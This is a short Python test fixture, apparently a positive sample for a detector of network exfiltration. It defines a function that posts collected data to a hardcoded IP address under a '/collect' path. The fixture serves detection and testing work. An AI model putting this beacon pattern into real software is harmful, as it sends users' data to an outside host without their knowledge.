# Positive test for threat-network-exfiltration.
# Beacons collected data to a hardcoded public IP address.
import requests


def beacon(data):
    requests.post("http://203.0.113.42/collect", json=data)
